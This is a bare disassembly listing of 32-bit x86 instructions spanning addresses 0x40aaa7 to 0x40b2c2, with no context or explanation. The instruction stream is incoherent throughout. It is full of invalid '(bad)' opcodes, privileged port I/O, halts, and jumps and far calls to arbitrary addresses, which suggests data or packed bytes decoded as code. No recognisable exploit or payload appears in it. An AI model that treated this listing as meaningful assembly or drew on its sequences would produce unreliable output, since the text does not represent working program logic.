  40aaa7:	or     dh,BYTE PTR [ecx+0x73]
  40aaaa:	cli    
  40aaab:	mov    ch,ch
  40aaad:	clc    
  40aaae:	imul   edi,DWORD PTR [ebp+esi*1+0x9],0x48ba1b1d
  40aab6:	icebp  
  40aab7:	inc    ebx
  40aab8:	loope  0x40aa9a
  40aaba:	sbb    DWORD PTR [edi+esi*1+0xdc61ed],ecx
  40aac1:	mov    ebp,0x96f77946
  40aac6:	add    DWORD PTR [edx],ebx
  40aac8:	test   DWORD PTR [esi-0x4b7efffb],0x9b6efe84
  40aad2:	or     DWORD PTR [ebp-0xc2fd54],ecx
  40aad8:	hlt    
  40aad9:	mov    ah,0x4b
  40aadb:	inc    ecx
  40aadc:	jmp    0xc3487394
  40aae1:	xor    eax,0xde4574ec
  40aae6:	adc    eax,0x9759e8e
  40aaeb:	sub    DWORD PTR ds:0x92c28025,0xfffffffd
  40aaf2:	retf   0xe907
  40aaf5:	popa   
  40aaf6:	sub    bl,0x1e
  40aaf9:	inc    eax
  40aafa:	std    
  40aafb:	(bad)  
  40aafc:	pushf  
  40aafd:	sub    ch,ah
  40aaff:	adc    al,0x74
  40ab01:	adc    eax,0x716a004a
  40ab06:	add    al,0x50
  40ab08:	(bad)  
  40ab09:	and    ebp,edi
  40ab0b:	(bad)  
  40ab0c:	jl     0x40ab38
  40ab0e:	in     al,dx
  40ab0f:	adc    al,0x58
  40ab11:	adc    eax,0xc66a004a
  40ab16:	add    al,0x8b
  40ab18:	xor    al,0x25
  40ab1a:	add    BYTE PTR [ecx],0x31
  40ab1d:	fs retf 0xe90b
  40ab21:	add    DWORD PTR [eax-0x59ff9515],eax
  40ab27:	in     al,0xfe
  40ab29:	xor    al,0x29
  40ab2b:	loope  0x40aaf6
  40ab2d:	gs pop edi
  40ab2f:	jmp    0x40ab3b
  40ab31:	test   eax,0xabc904c1
  40ab36:	and    cl,BYTE PTR [ecx]
  40ab38:	call   DWORD PTR [ecx+ebp*1]
  40ab3b:	loope  0x40aaf9
  40ab3d:	inc    edi
  40ab3e:	aas    
  40ab3f:	jmp    0x40ab4b
  40ab41:	test   eax,0xc9059e
  40ab46:	ficom  DWORD PTR [edi]
  40ab48:	add    bh,bh
  40ab4a:	and    eax,0xf875fefc
  40ab4f:	ffreep st(3)
  40ab51:	std    
  40ab52:	lahf   
  40ab53:	repz or eax,eax
  40ab56:	in     eax,0xeb
  40ab58:	mov    edx,0x816807f8
  40ab5e:	call   0xe8a8aba7
  40ab63:	addr16 inc ecx
  40ab65:	add    BYTE PTR [eax+0x1fff9238],al
  40ab6b:	(bad)  
  40ab6c:	mov    edi,0x815fcf75
  40ab71:	pusha  
  40ab72:	cdq    
  40ab73:	pop    es
  40ab74:	push   0x44efa2
  40ab79:	call   0x3e453b
  40ab7e:	rol    edi,cl
  40ab80:	or     eax,0x55584
  40ab85:	add    BYTE PTR ds:0x50fc49,bl
  40ab8b:	lahf   
  40ab8c:	pop    ebx
  40ab8d:	or     al,0xff
  40ab8f:	jne    0x40ab15
  40ab91:	pop    esi
  40ab92:	inc    ecx
  40ab93:	cwde   
  40ab94:	xchg   dl,al
  40ab96:	or     BYTE PTR [ebx-0x527af239],al
  40ab9c:	pop    es
  40ab9d:	add    BYTE PTR [eax],al
  40ab9f:	repnz add al,0x8d
  40aba2:	inc    ebp
  40aba3:	adc    BYTE PTR [edx+ebp*2-0x1],0x0
  40aba8:	punpcklwd mm0,DWORD PTR [ecx+0x48]
  40abac:	hlt    
  40abad:	jae    0x40abab
  40abaf:	lahf   
  40abb0:	sti    
  40abb1:	mov    BYTE PTR [eax+0x19],ah
  40abb4:	add    eax,0x44c483
  40abb9:	ror    BYTE PTR [edi],0xd5
  40abbc:	test   bh,bh
  40abbe:	push   DWORD PTR [ecx]
  40abc0:	loop   0x40abb5
  40abc2:	je     0x40abed
  40abc4:	jl     0x40abd4
  40abc6:	lea    edx,[ecx-0xa7cfbdf]
  40abcc:	in     al,0x7f
  40abce:	test   DWORD PTR [ebp-0x64170214],0xb40002e1
  40abd8:	popf   
  40abd9:	out    dx,al
  40abda:	dec    edi
  40abdb:	mov    esp,eax
  40abdd:	repz je 0x40abd9
  40abe0:	dec    eax
  40abe1:	adc    bh,bh
  40abe3:	out    dx,al
  40abe4:	cmp    ecx,DWORD PTR [ecx]
  40abe6:	shl    BYTE PTR [esi],0x5c
  40abe9:	inc    ebp
  40abea:	add    DWORD PTR [ecx],esi
  40abec:	loopne 0x40ac6d
  40abee:	jl     0x40abf0
  40abf0:	fucom  st(0)
  40abf2:	add    eax,DWORD PTR [esp+esi*2-0x4efffd1f]
  40abf9:	call   0xccf5bb00
  40abfe:	add    DWORD PTR [eax],eax
  40ac00:	xor    DWORD PTR [eax-0x615aab79],esi
  40ac06:	push   eax
  40ac07:	call   0xff360761
  40ac0c:	sti    
  40ac0d:	js     0x40ac4e
  40ac0f:	call   0xff3019aa
  40ac14:	add    al,0x8
  40ac16:	push   edx
  40ac17:	call   0xff3506fe
  40ac1c:	jbe    0x40ac43
  40ac1e:	hlt    
  40ac1f:	push   DWORD PTR [esi-0x20]
  40ac22:	add    al,bh
  40ac24:	hlt    
  40ac25:	stos   DWORD PTR es:[edi],eax
  40ac26:	add    al,BYTE PTR [eax]
  40ac28:	xor    eax,esp
  40ac2a:	jg     0x40ac68
  40ac2c:	mov    eax,0x31004340
  40ac31:	sub    eax,0x41be6852
  40ac36:	inc    ebx
  40ac37:	add    BYTE PTR [ecx+0x9],bl
  40ac3a:	arpl   WORD PTR [edx+0x31],si
  40ac3d:	or     DWORD PTR [ecx],edi
  40ac3f:	ins    BYTE PTR es:[edi],dx
  40ac40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac41:	push   0x742e0428
  40ac46:	sub    ebx,0x3e97690
  40ac4c:	sub    cl,cl
  40ac4e:	hlt    
  40ac4f:	sbb    ecx,DWORD PTR [ecx+0x430793]
  40ac55:	xor    ecx,esp
  40ac57:	dec    esi
  40ac58:	jb     0x40ac8b
  40ac5a:	or     DWORD PTR [ecx-0x57985895],edi
  40ac60:	add    esi,esi
  40ac62:	jae    0x40aca5
  40ac64:	jmp    0x40acda
  40ac66:	jbe    0x40ac51
  40ac68:	add    edi,DWORD PTR [edx]
  40ac6a:	leave  
  40ac6b:	mov    esp,0xc78b494b
  40ac70:	inc    edx
  40ac71:	xor    ecx,esp
  40ac73:	push   0x72
  40ac75:	xor    DWORD PTR [ecx],ecx
  40ac77:	cdq    
  40ac78:	imul   esp,DWORD PTR [edi-0x41fc5799],0x73
  40ac7f:	adc    ebx,ebp
  40ac81:	or     BYTE PTR [esi-0x17],dh
  40ac84:	add    ebx,DWORD PTR [edx-0x37c995e6]
  40ac8a:	push   0x743003a8
  40ac8f:	jecxz  0x40acfc
  40ac91:	into   
  40ac92:	addr16 test al,0x3
  40ac95:	cdq    
  40ac96:	dec    ecx
  40ac97:	js     0x40ac9c
  40ac99:	xor    DWORD PTR [ecx+0x51],ebx
  40ac9c:	stos   DWORD PTR es:[edi],eax
  40ac9d:	adc    DWORD PTR [eax-0x17],ecx
  40aca0:	repnz std 
  40aca2:	loopne 0x40ac64
  40aca4:	or     esp,edx
  40aca6:	or     cl,ch
  40aca8:	fidivr WORD PTR [ebx]
  40acaa:	xchg   BYTE PTR [ebx],al
  40acac:	(bad)  
  40acad:	inc    BYTE PTR [edi-0x17]
  40acb0:	add    eax,0x20006dc
  40acb5:	jne    0x40acb5
  40acb7:	mov    edi,0x7bd30034
  40acbc:	inc    esp
  40acbd:	popf   
  40acbe:	in     eax,0x5e
  40acc0:	add    DWORD PTR [esi-0x23180f48],ebx
  40acc6:	and    al,ch
  40acc8:	dec    BYTE PTR [esi-0x6eb02258]
  40acce:	push   edx
  40accf:	out    0xfe,al
  40acd1:	jle    0x40ac67
  40acd3:	dec    ebp
  40acd4:	lock fs js 0x40acb5
  40acd8:	dec    edi
  40acd9:	add    ebp,DWORD PTR [edi]
  40acdb:	call   0x41e0e54
  40ace0:	(bad)  
  40ace1:	pop    esi
  40ace2:	add    ch,al
  40ace4:	je     0x40ad43
  40ace6:	test   ecx,esi
  40ace8:	adc    al,0x4c
  40acea:	loop   0x40acd3
  40acec:	mov    BYTE PTR [esi+edi*8+0x2d517c8b],ch
  40acf3:	pop    ebp
  40acf4:	xor    al,0x6a
  40acf6:	inc    eax
  40acf7:	cmc    
  40acf8:	push   DWORD PTR [eax+edx*1-0x2c16ff8f]
  40acff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad00:	(bad)  
  40ad01:	xchg   esp,eax
  40ad02:	mov    edx,0xa26bcdf0
  40ad07:	out    0xfe,eax
  40ad09:	xchg   esp,eax
  40ad0a:	mov    ah,bh
  40ad0c:	je     0x40acff
  40ad0e:	jp     0x40ad3d
  40ad10:	cmp    esi,0xffffffa3
  40ad13:	out    0x74,eax
  40ad15:	stc    
  40ad16:	sbb    DWORD PTR [ebp+0x8],0x1
  40ad1a:	aaa    
  40ad1b:	mov    esi,?
  40ad1d:	out    0x0,al
  40ad1f:	sbb    DWORD PTR [ebp-0x14],0xffffffde
  40ad23:	stc    
  40ad24:	adc    al,ch
  40ad26:	out    0xb7,al
  40ad28:	out    0xfe,eax
  40ad2a:	into   
  40ad2b:	jmp    0x9c419508
  40ad30:	xchg   ecx,eax
  40ad31:	std    
  40ad32:	call   DWORD PTR [edi+0x74e8ec61]
  40ad38:	xchg   ecx,eax
  40ad39:	std    
  40ad3a:	call   DWORD PTR [edi-0x5317179f]
  40ad40:	xchg   ecx,eax
  40ad41:	std    
  40ad42:	jmp    DWORD PTR [ecx-0x38000374]
  40ad48:	fidiv  DWORD PTR [ebx-0x4]
  40ad4b:	mov    bh,0x0
  40ad4d:	test   DWORD PTR [eax+0x49],esp
  40ad50:	or     eax,0xc40cc483
  40ad55:	jg     0x40ad53
  40ad57:	xchg   ebx,ebx
  40ad59:	mov    edx,0x8b550be8
  40ad5f:	fs aas 
  40ad61:	push   0x0
  40ad63:	push   edi
  40ad64:	popa   
  40ad65:	or     al,ch
  40ad67:	mov    ds:0x53fffe64,eax
  40ad6c:	aam    0x51
  40ad6e:	call   0x4109d5
  40ad73:	jecxz  0x40ad40
  40ad75:	jb     0x40ad92
  40ad77:	fcmovne st,st(6)
  40ad79:	inc    esi
  40ad7a:	jmp    0x40ad66
  40ad7c:	mov    esi,DWORD PTR [esi]
  40ad7e:	or     eax,0x3880109c
  40ad83:	add    dl,al
  40ad85:	pusha  
  40ad86:	add    eax,0xeb0b98c6
  40ad8b:	add    dh,BYTE PTR [ebx]
  40ad8d:	adc    DWORD PTR [eax+0x3b],ecx
  40ad90:	dec    ebx
  40ad91:	pop    edi
  40ad92:	jmp    0x9cc2:0xc9574b8b
  40ad99:	or     edx,DWORD PTR [ebp-0x75]
  40ad9c:	test   BYTE PTR [ebp-0x25c04b3e],cl
  40ada2:	jae    0x40adb0
  40ada4:	pusha  
  40ada5:	cmp    BYTE PTR [edx-0x340ce01],cl
  40adab:	mov    edi,0xc94fecdc
  40adb0:	jae    0x40ad73
  40adb2:	add    bh,bh
  40adb4:	fdivr  st(5),st
  40adb6:	fimul  DWORD PTR [ebp-0x63]
  40adb9:	sahf   
  40adba:	lock or dh,BYTE PTR [ecx+0x1d]
  40adbe:	pop    es
  40adbf:	pop    edi
  40adc0:	push   0x360013b3
  40adc5:	cld    
  40adc6:	pop    ss
  40adc7:	jmp    DWORD PTR [eax+eiz*8-0x67d5ab26]
  40adce:	lock mov WORD PTR [eax+eiz*2+0x54],?
  40add3:	call   FWORD PTR [esp+esi*8+0x5fbbf1da]
  40adda:	icebp  
  40addb:	or     dh,cl
  40addd:	mov    DWORD PTR [esi+0x2f03207],0xf1447cff
  40ade7:	je     0x40ade9
  40ade9:	jmp    0xe6d06936
  40adee:	push   edi
  40adef:	std    
  40adf0:	mov    edi,0x1e0742e
  40adf5:	xor    eax,esi
  40adf7:	jns    0x40ae3d
  40adf9:	(bad)  [ebx-0x14]
  40adfc:	jg     0x40ae04
  40adfe:	lock inc DWORD PTR [ebx+0x2f2e7]
  40ae05:	pop    esi
  40ae06:	clc    
  40ae07:	push   esi
  40ae08:	jmp    FWORD PTR [esi-0x7ebb8501]
  40ae0e:	pop    ss
  40ae0f:	ja     0x40ade1
  40ae11:	or     esi,ebx
  40ae13:	popa   
  40ae14:	inc    ecx
  40ae15:	xor    eax,edi
  40ae17:	fs jo  0x40ae4b
  40ae1a:	lock push edx
  40ae1c:	(bad)  
  40ae1d:	cld    
  40ae1e:	call   FWORD PTR [ebx+0x12]
  40ae21:	adc    BYTE PTR [ecx],cl
  40ae23:	sub    BYTE PTR [ecx+ecx*4],al
  40ae26:	cmp    al,0x59
  40ae28:	add    al,0x31
  40ae2a:	cmp    esi,edx
  40ae2c:	jbe    0x40adaf
  40ae2e:	jno    0x40ae27
  40ae30:	(bad)  
  40ae31:	lock or cl,dl
  40ae34:	dec    eax
  40ae35:	loope  0x40ae3f
  40ae37:	jmp    0xa9529689
  40ae3c:	ja     0x40ae73
  40ae3e:	adc    bl,BYTE PTR [ebx-0x4fedd689]
  40ae44:	add    BYTE PTR [ebx+edx*4+0x123103ea],ch
  40ae4b:	mov    al,ds:0xce380076
  40ae50:	and    edi,DWORD PTR [eax+0x3e90931]
  40ae56:	or     cl,BYTE PTR [esi]
  40ae58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae59:	inc    esi
  40ae5a:	lds    ecx,FWORD PTR [eax]
  40ae5c:	jmp    0xba25df64
  40ae61:	ret    
  40ae62:	mov    ecx,0xf7f065e5
  40ae67:	fimul  DWORD PTR [esi-0x16a3c9d5]
  40ae6d:	enter  0xf16d,0xe8
  40ae71:	add    esi,DWORD PTR [ecx]
  40ae73:	or     DWORD PTR [ecx+0x30],ebp
  40ae76:	xor    DWORD PTR [esi],edx
  40ae78:	gs dec ebx
  40ae7a:	xor    ecx,DWORD PTR [ecx]
  40ae7c:	jmp    0x2f0687d9
  40ae81:	lock mov edi,0xb3bfab8f
  40ae87:	arpl   WORD PTR [ecx],dx
  40ae89:	add    esp,DWORD PTR [eax+ebp*1]
  40ae8c:	sbb    esi,0xf0e947f7
  40ae92:	and    eax,0x7e810d5
  40ae97:	or     ecx,ebp
  40ae99:	cld    
  40ae9a:	into   
  40ae9b:	adc    eax,0xb346c00
  40aea0:	add    cl,ch
  40aea2:	imul   ecx,DWORD PTR [eax+ebp*8-0x18],0xd0000932
  40aeaa:	outs   dx,DWORD PTR ds:[esi]
  40aeab:	pop    es
  40aeac:	add    cl,ch
  40aeae:	mov    bl,0x64
  40aeb0:	call   0x1619af9d
  40aeb5:	mov    DWORD PTR [ecx+ecx*2-0x32],eax
  40aeb9:	inc    esp
  40aeba:	shl    DWORD PTR [ebx],1
  40aebc:	or     DWORD PTR [eax],eax
  40aebe:	jmp    0xe9417928
  40aec3:	xor    cl,BYTE PTR [edx+0x5c33917c]
  40aec9:	pshufw mm4,QWORD PTR [eax+0x52cc6e9],0x8
  40aed1:	add    cl,ch
  40aed3:	xor    dh,dl
  40aed5:	lods   eax,DWORD PTR ds:[esi]
  40aed6:	call   0xfcc3b80d
  40aedb:	jmp    0xdc65:0x85e67507
  40aee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aee3:	push   0x32e903f1
  40aee8:	or     ecx,ebp
  40aeea:	xor    BYTE PTR [ecx+ecx*1],0x0
  40aeee:	push   0x60
  40aef0:	icebp  
  40aef1:	add    edx,esp
  40aef3:	fist   WORD PTR [ecx+0x4dee217c]
  40aef9:	call   0x49e1e2
  40aefe:	inc    eax
  40aeff:	mov    ecx,0xb3e90009
  40af04:	gs call 0x6cce66f6
  40af0a:	call   0x94c9b841
  40af0f:	jle    0x40ae98
  40af11:	jl     0x40af68
  40af13:	xor    eax,0x95d
  40af18:	inc    edi
  40af19:	push   edx
  40af1a:	call   0x494721
  40af1f:	jmp    0x40aeb8
  40af21:	retf   
  40af22:	inc    ebx
  40af23:	call   0x40b7be
  40af28:	(bad)  
  40af29:	push   ecx
  40af2a:	rol    BYTE PTR [eax],0x58
  40af2d:	or     BYTE PTR [eax],al
  40af2f:	(bad)  
  40af30:	adc    eax,0x48fffea5
  40af35:	or     bh,al
  40af37:	inc    ebp
  40af38:	test   BYTE PTR [eax],cl
  40af3a:	add    BYTE PTR [eax],al
  40af3c:	pop    eax
  40af3d:	retf   
  40af3e:	inc    ebx
  40af3f:	mov    esp,0x858
  40af44:	xchg   edi,eax
  40af45:	push   ecx
  40af46:	mov    eax,0x84800
  40af4b:	inc    DWORD PTR [ebp-0xf]
  40af4e:	out    0x13,al
  40af50:	mov    esi,0x5589fdf2
  40af55:	int    0xfd
  40af57:	jne    0x40af25
  40af59:	mov    edi,0xf38ffe06
  40af5e:	xchg   DWORD PTR [ebp-0x30],eax
  40af61:	bnd jae 0x40af38
  40af64:	mov    al,0xd8
  40af66:	sti    
  40af67:	dec    DWORD PTR [edi+0x5bc44465]
  40af6d:	sbb    DWORD PTR [ecx+0x79960],ebx
  40af73:	jne    0x40af0f
  40af75:	aas    
  40af76:	(bad)  
  40af77:	popa   
  40af78:	mov    DWORD PTR [edi],eax
  40af7a:	call   0x83eb006
  40af7f:	add    BYTE PTR [eax-0x10],dl
  40af82:	bound  esp,QWORD PTR [eax+0x41]
  40af85:	enter  0x73f2,0xc0
  40af89:	and    BYTE PTR [ebx],al
  40af8b:	jo     0x40af8d
  40af8d:	cwde   
  40af8e:	fidivr WORD PTR [esi+0x5ada3174]
  40af94:	xchg   esi,eax
  40af95:	adc    BYTE PTR [ecx+0x7c0ae802],dh
  40af9b:	add    al,BYTE PTR [eax]
  40af9d:	loope  0x40b018
  40af9f:	xchg   esp,eax
  40afa0:	pusha  
  40afa1:	lock icebp 
  40afa3:	in     eax,dx
  40afa4:	je     0x40b017
  40afa6:	or     DWORD PTR [edx],edx
  40afa8:	jo     0x40afdb
  40afaa:	repnz idiv DWORD PTR [edi-0x61a3fd1b]
  40afb1:	shl    BYTE PTR [eax],1
  40afb3:	add    al,0xe8
  40afb5:	out    dx,al
  40afb6:	and    eax,DWORD PTR [eax+eax*1]
  40afb9:	add    DWORD PTR [edx],edi
  40afbb:	mov    fs,WORD PTR [eax-0x10]
  40afbe:	icebp  
  40afbf:	jmp    0x40b035
  40afc1:	jno    0x40af8c
  40afc3:	hlt    
  40afc4:	outs   dx,BYTE PTR ds:[esi]
  40afc5:	xor    edx,esi
  40afc7:	xlat   BYTE PTR ds:[ebx]
  40afc8:	and    al,0xb2
  40afca:	in     al,dx
  40afcb:	mov    DWORD PTR [edi+0x70],ebx
  40afce:	lock add DWORD PTR [ebp+0x4b],esi
  40afd2:	or     BYTE PTR [ebp-0x250f8fa0],ah
  40afd8:	sub    eax,DWORD PTR [edi-0x66affd10]
  40afde:	dec    ebx
  40afdf:	arpl   WORD PTR [ecx+0x0],ax
  40afe2:	xor    DWORD PTR [ebx+0x77],ebx
  40afe5:	ror    BYTE PTR [ecx],0x7d
  40afe8:	pop    esp
  40afe9:	add    BYTE PTR [ecx],dh
  40afeb:	aaa    
  40afec:	add    ch,BYTE PTR [ebx]
  40afee:	icebp  
  40afef:	xlat   BYTE PTR ds:[ebx]
  40aff0:	ret    0x5374
  40aff3:	cmp    esi,DWORD PTR [edi-0x38]
  40aff6:	leave  
  40aff7:	ret    0x5c
  40affa:	xor    DWORD PTR [eax+0x38f974eb],eax
  40b000:	stc    
  40b001:	stc    
  40b002:	(bad)  
  40b003:	sbb    edi,DWORD PTR [ebx+0x44]
  40b006:	jge    0x40b03b
  40b008:	ja     0x40afce
  40b00a:	leave  
  40b00b:	or     DWORD PTR [ebx],esp
  40b00d:	pop    edi
  40b00e:	xor    DWORD PTR [ecx],ecx
  40b010:	mov    ecx,0xcd1dec
  40b015:	cmc    
  40b016:	cdq    
  40b017:	loop   0x40b026
  40b019:	jnp    0x40b008
  40b01b:	mov    al,ds:0x9716f69
  40b020:	jne    0x40b059
  40b022:	mov    dl,0x64
  40b024:	xor    DWORD PTR [eax*1+0x31038133],eax
  40b02b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b02d:	in     al,dx
  40b02e:	in     eax,0x10
  40b030:	shl    DWORD PTR [ebx-0x132a1e19],1
  40b036:	in     eax,0xc8
  40b038:	int    0x76
  40b03a:	sub    ecx,esi
  40b03c:	in     eax,dx
  40b03d:	or     DWORD PTR [edi-0x1e],0xffffffbd
  40b041:	jbe    0x40afc8
  40b043:	loop   0x40b080
  40b045:	cld    
  40b046:	add    BYTE PTR [esi-0x1b],dl
  40b049:	sub    eax,0x1be237ed
  40b04e:	lods   al,BYTE PTR ds:[esi]
  40b04f:	das    
  40b050:	pop    esp
  40b051:	icebp  
  40b052:	(bad)  [ecx]
  40b054:	bound  edx,QWORD PTR [esi-0x56a3e014]
  40b05a:	(bad)  
  40b05c:	xchg   BYTE PTR [ebp-0x4ea3f014],al
  40b062:	fcomi  st,st(4)
  40b064:	xchg   BYTE PTR [ebp-0x14],dh
  40b067:	call   FWORD PTR [ebx-0x5b]
  40b06a:	fucomi st,st(4)
  40b06c:	xchg   BYTE PTR [ebp-0x14],ah
  40b06f:	out    dx,eax
  40b070:	pop    ebx
  40b071:	popf   
  40b072:	(bad)  [esi+eax*4+0x5bdfec55]
  40b079:	xchg   ecx,eax
  40b07a:	fistp  DWORD PTR [esi+eax*4+0x13dbec45]
  40b081:	push   0x6e
  40b083:	(bad)  [edx]
  40b085:	add    BYTE PTR [ebp+esi*1+0x304144ca],bh
  40b08c:	or     DWORD PTR [eax],eax
  40b08e:	jmp    0xea291544
  40b093:	push   ds
  40b094:	sbb    DWORD PTR [eax+0x4],ebp
  40b097:	pop    ebp
  40b098:	dec    eax
  40b099:	add    BYTE PTR [esi],cl
  40b09b:	pop    ds
  40b09c:	aad    0xe7
  40b09e:	adc    edi,ebp
  40b0a0:	or     BYTE PTR [eax],al
  40b0a2:	bnd jb 0x40b101
  40b0a5:	pop    es
  40b0a6:	cs div eax
  40b0a9:	add    cl,ch
  40b0ab:	add    BYTE PTR [edx],dh
  40b0ad:	or     DWORD PTR [eax+0x72],ebp
  40b0b0:	aam    0x47
  40b0b2:	add    dh,bl
  40b0b4:	loopne 0x40b08a
  40b0b6:	out    0xb9,eax
  40b0b8:	clc    
  40b0b9:	or     BYTE PTR [eax],al
  40b0bb:	loop   0x40b12f
  40b0bd:	pop    esp
  40b0be:	pop    es
  40b0bf:	scas   al,BYTE PTR es:[edi]
  40b0c0:	lock lock add ecx,ebp
  40b0c4:	xor    cl,BYTE PTR [ecx]
  40b0c6:	(bad)  
  40b0c7:	cmp    al,0x79
  40b0c9:	jmp    0xe28b1c36
  40b0ce:	sti    
  40b0cf:	(bad)  
  40b0d1:	mov    eax,ds:0xe01a9efe
  40b0d6:	icebp  
  40b0d7:	inc    edi
  40b0d8:	dec    ebp
  40b0d9:	or     BYTE PTR [edi],cl
  40b0db:	fs stos BYTE PTR es:[edi],al
  40b0dd:	(bad)  
  40b0df:	xchg   BYTE PTR [edx],bl
  40b0e1:	push   esi
  40b0e2:	rcl    BYTE PTR [ecx+0x76fe8b4a],1
  40b0e8:	or     dl,BYTE PTR [esi-0x14]
  40b0eb:	xor    DWORD PTR [edx-0x75],0x456866fe
  40b0f2:	lock mov ecx,0x5688570a
  40b0f8:	retf   0xebe8
  40b0fb:	push   ecx
  40b0fc:	retf   0x5edf
  40b0ff:	add    BYTE PTR [ecx],al
  40b101:	(bad)  
  40b102:	push   cs
  40b103:	add    BYTE PTR [ebp+0xc81eb5f],bl
  40b109:	cdq    
  40b10a:	cld    
  40b10b:	inc    DWORD PTR [edi]
  40b10d:	int3   
  40b10e:	cmp    DWORD PTR [eax-0x20baa00],0x0
  40b115:	cwde   
  40b116:	or     al,0x0
  40b118:	mov    ecx,ebp
  40b11a:	adc    BYTE PTR [ebx],cl
  40b11c:	sar    BYTE PTR [ecx+ecx*1+0x59983880],0x5
  40b124:	jmp    0x40b7f5
  40b129:	xchg   DWORD PTR [ecx+0x14],ebx
  40b12c:	call   0x3f12d1
  40b131:	arpl   sp,cx
  40b133:	jae    0x40b144
  40b135:	add    bh,dl
  40b137:	dec    ebp
  40b138:	inc    ecx
  40b139:	dec    eax
  40b13a:	repz jae 0x40b151
  40b13d:	jo     0x40b1b9
  40b13f:	cmp    edi,0x77
  40b142:	mov    edi,0x237f680b
  40b147:	inc    ecx
  40b148:	add    BYTE PTR [edi-0x3017eba7],al
  40b14e:	mov    ch,bh
  40b150:	jmp    DWORD PTR [ecx-0x38014977]
  40b156:	repnz or WORD PTR ds:[eax+eax*1],cx
  40b15c:	lea    ecx,[ebp-0x4800033a]
  40b162:	cmp    ebp,eax
  40b164:	call   FWORD PTR [ecx-0x7272020d]
  40b16a:	(bad)  
  40b16b:	cld    
  40b16c:	inc    DWORD PTR [edi-0x6f4a00c4]
  40b172:	icebp  
  40b173:	std    
  40b174:	inc    DWORD PTR [eax]
  40b176:	adc    BYTE PTR ds:0xf231006d,0x7b
  40b17d:	test   BYTE PTR [ebp+0x71feea4f],dl
  40b183:	xlat   BYTE PTR ds:[ebx]
  40b184:	jle    0x40b16b
  40b186:	xor    dl,dh
  40b188:	add    cl,BYTE PTR [ebp-0x116cc5c]
  40b18e:	mov    dh,0x16
  40b190:	add    eax,0x2f23110
  40b195:	shrd   DWORD PTR [edx+0x3],esi,cl
  40b199:	add    BYTE PTR [ecx],dh
  40b19b:	gs inc ebp
  40b19d:	sub    al,0x1
  40b19f:	mov    dl,bh
  40b1a1:	dec    esi
  40b1a2:	lock icebp 
  40b1a4:	fimul  DWORD PTR [ecx]
  40b1a6:	adc    al,0xf2
  40b1a8:	add    cl,BYTE PTR [ebx]
  40b1aa:	jno    0x40b208
  40b1ac:	add    cl,ch
  40b1ae:	cdq    
  40b1af:	lock add al,BYTE PTR [eax]
  40b1b2:	mov    esp,0x66fdc65c
  40b1b7:	mov    esi,0x220d4176
  40b1bc:	pop    esp
  40b1bd:	out    dx,eax
  40b1be:	out    0x30,al
  40b1c0:	add    al,0xe8
  40b1c2:	pop    esp
  40b1c3:	xor    eax,0xb23a0004
  40b1c8:	outs   dx,BYTE PTR ds:[esi]
  40b1c9:	add    eax,0x31a48
  40b1ce:	xor    DWORD PTR [edi+0x3d19146e],ebp
  40b1d4:	js     0x40b1d4
  40b1d6:	es fadd st(2),st
  40b1d9:	je     0x40b1db
  40b1db:	or     BYTE PTR cs:[edx-0x180f8fb9],bl
  40b1e2:	je     0x40b209
  40b1e4:	js     0x40b1db
  40b1e6:	add    DWORD PTR [esi],0x60
  40b1e9:	fisttp QWORD PTR [ecx]
  40b1eb:	mov    esi,eax
  40b1ed:	out    0x74,eax
  40b1ef:	sbb    eax,0xee83e188
  40b1f4:	or     DWORD PTR [esi+0x77],esp
  40b1f7:	mov    ebp,0xdfe95ecb
  40b1fc:	mov    WORD PTR [edx+0x41398317],?
  40b202:	push   ds
  40b203:	mov    ah,0xde
  40b205:	inc    ebp
  40b206:	push   esp
  40b207:	popa   
  40b208:	fidiv  WORD PTR [ebx-0x1aab41ed]
  40b20e:	call   0xf581c350
  40b213:	lods   al,BYTE PTR ds:[esi]
  40b214:	fisub  WORD PTR ds:0x1d8850dc
  40b21a:	jmp    0x428dfa8
  40b21f:	xor    DWORD PTR [edx+ebp*4+0x3c84b817],ecx
  40b226:	jmp    0x6998:0x2769de87
  40b22d:	test   al,0x3
  40b22f:	xor    dl,BYTE PTR [edi+eiz*4+0x5b]
  40b233:	sub    DWORD PTR [ecx+0x28],0x94946604
  40b23a:	jmp    0x5901909e
  40b23f:	add    ah,al
  40b241:	or     cl,ch
  40b243:	cld    
  40b244:	mov    ss,WORD PTR [ebp+0x14]
  40b247:	pop    esp
  40b248:	xchg   edi,eax
  40b249:	push   ecx
  40b24a:	sub    BYTE PTR [esi+edi*1],al
  40b24d:	push   esp
  40b24e:	fstp   st(3)
  40b250:	test   eax,0x2fe8ad85
  40b255:	xchg   esp,eax
  40b256:	pop    esp
  40b257:	jmp    0xdc799083
  40b25c:	add    DWORD PTR [ebp+0x7166e895],eax
  40b262:	call   0x18dfd06a
  40b267:	jmp    0xc7d1c3e9
  40b26c:	aam    0xdd
  40b26e:	push   DWORD PTR [ebp-0x26]
  40b271:	iret   
  40b272:	jg     0x40b2e2
  40b274:	f2xm1  
  40b276:	shr    ecx,cl
  40b278:	xor    cl,BYTE PTR [ecx]
  40b27a:	push   0x485240
  40b27f:	push   esi
  40b280:	xchg   DWORD PTR [ecx-0x1a26b103],ebx
  40b286:	sub    ah,dl
  40b288:	xor    cl,BYTE PTR [ecx]
  40b28a:	or     ebp,DWORD PTR [ecx]
  40b28c:	dec    esi
  40b28d:	das    
  40b28e:	push   0x47fa87
  40b293:	cs pop ds
  40b295:	cmc    
  40b296:	out    0xaa,eax
  40b298:	es (bad) 
  40b29b:	push   ds
  40b29c:	iret   
  40b29d:	cdq    
  40b29e:	std    
  40b29f:	push   ss
  40b2a0:	mov    DWORD PTR [ebp-0x18],ecx
  40b2a3:	bound  eax,QWORD PTR [eax]
  40b2a5:	push   cs
  40b2a6:	(bad)  
  40b2a8:	cdq    
  40b2a9:	cdq    
  40b2aa:	push   esp
  40b2ab:	adc    dh,bh
  40b2ad:	or     al,0xd
  40b2af:	push   eax
  40b2b0:	test   BYTE PTR [ecx+edx*1],0xe8
  40b2b4:	pop    esp
  40b2b5:	pop    edx
  40b2b6:	fdivp  st(6),st
  40b2b8:	shl    DWORD PTR [edx+0x56deff5d],1
  40b2be:	xchg   esp,eax
  40b2bf:	mov    bl,0xd7
  40b2c1:	dec    esi
  40b2c2:	fsubrp st(7),st
